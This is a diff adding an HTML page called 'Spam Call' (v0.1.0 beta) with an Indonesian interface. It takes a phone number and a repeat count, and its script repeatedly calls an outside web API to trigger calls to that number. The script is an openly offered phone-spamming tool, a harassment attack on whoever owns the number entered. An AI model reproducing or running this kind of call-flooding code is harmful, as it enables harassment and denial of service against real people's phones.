@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Project</title>
+</head>
+
+<style>
+body{
+    background: url("s.png");
+    margin: 0;
+    background-size: cover;
+}
+
+h1{
+    background: linear-gradient(to right, cyan, lime);
+    background-clip: text;
+    -webkit-background-clip: text;
+    color: transparent;
+    font: 35px sans-serif;
+    text-transform: uppercase;
+}
+
+p{
+    color: orangered;
+    font: 25px sans-serif;
+    text-transform: uppercase;
+    text-decoration: underline;
+}
+
+.main{
+    width: 35%;
+    background: cyan;
+    padding-bottom: 10%;
+    margin-top: 3%;
+    opacity: 0.7;
+    border: 4px solid lime;
+}
+
+.main h1{
+    padding: 25px;
+    color:crimson;
+    text-transform: uppercase;
+    font: 30px sans-serif;
+}
+
+#hasil{
+    padding: 100px;
+    background: black;
+    width: 35%;
+}
+
+#nomor{
+    padding: 2%;
+    background:yellow;
+    border: 2px solid black;
+    color: red;
+}
+
+#btn{
+    padding: 2%;
+    background: red;
+    border: 2px solid black;
+}
+
+#nomor:hover{
+    background: lime;
+    border-radius: 35px;
+    transition: 1s
+}
+
+#btn:hover{
+    background: teal;
+    border-radius: 25px;
+    transition: 1s;
+}
+
+#s{
+    color: white;
+}
+
+#jumlah{
+    padding: 5px;
+    margin-top: 5px;
+    margin-right: 92px;
+    background: blue;
+    border: 2px solid black;
+}
+
+#jumlah:hover{
+    background: lime;
+    border-radius: 35px;
+    transition: 1s;
+}
+
+</style>
+
+<script>
+var x = new XMLHttpRequest()
+
+function k(){
+var p = document.getElementById("nomor").value;
+var d = document.getElementById("jumlah").value;
+for(var i = 0; i < d; i++){
+setTimeout(function(){
+x.open("GET", "http://0x.nakocoders.org/rest-api/lain-nya/api.php?nomor=" + p);
+x.send();
+}, 2000);
+}
+}
+</script>
+
+<body>
+<center>
+    <h1>Spam Call by fajar firdaus</h1>
+    <p>version 0.1.0 (beta)</p>
+</center>
+<center>
+<div class="main">
+<h1>Spam Call</h1>
+<h1 id="s"></h1>
+<input type="number" id="nomor" placeholder="Masukan Nomor"> <button type="button" id="btn" onclick="k();">Klick Me</button>
+<br>
+<input type="number" id="jumlah" placeholder="Masukan jumlah">
+</center>
+</div> 
+<iframe src="bg.mp3" width="0" height="0" frameborder="0"></iframe>   
+</body>
+</html>
